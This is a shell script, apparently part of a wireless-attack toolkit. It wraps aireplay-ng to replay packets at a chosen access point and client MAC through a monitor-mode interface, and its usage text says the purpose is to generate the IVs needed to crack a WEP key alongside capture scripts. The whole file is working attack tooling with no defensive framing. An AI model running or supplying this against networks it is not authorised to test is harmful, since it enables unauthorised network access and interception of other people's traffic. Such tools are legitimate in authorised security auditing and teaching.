#!/bin/sh

if [ $# -eq 0 ]; then
	echo "Usage: $0 <AP BSSID> <Client Mac>"
	echo "This application will force a WEP-based client-AP conversation to generate the iv's needed for capture."
	echo "It should be used in tandem with wireless.capture.sh "
	echo "to capture data."
	echo " "
	echo "<AP BSSID>   can be discovered through wireless.display_aps.sh"
	echo "             in the top section."
	echo "<Client Mac> can be discovered through wireless.display_aps.sh"
	echo "             as the station identifier in the bottom section."
	echo "All BSSID/Macs are of the format 01:02:03:04:05:06"
	echo " "
	echo "Once run, you should see data increasing in "
	echo "wireless.web_capture_ivs.sh (airodump)"
	exit 1
fi

APMAC=$1
CLIENTMAC=$2

# MONINTERFACE=`iwconfig 2> /dev/null | grep  -B 1 "Mode:Monitor" | grep -Eio --max-count=1 "^.*?IEEE" | sed "s|\sIEEE||" | sed "s|\s||"`
MONINTERFACE=`iwconfig 2> /dev/null | grep  -B 1 "Mode:Monitor" | grep -Eio "^[a-z,A-Z,0-9]{3,7}" | sed "s|\sIEEE||" | sed "s|\s||"`

if [ ${#MONINTERFACE} -gt 0 ]; then
	aireplay-ng --interactive -b $APMAC -h $CLIENTMAC -x 512 $MONINTERFACE
else
	if [ $VERBOSE -eq 1 ]; then
		echo "ERROR: No monitoring interface configured."
	fi
fi

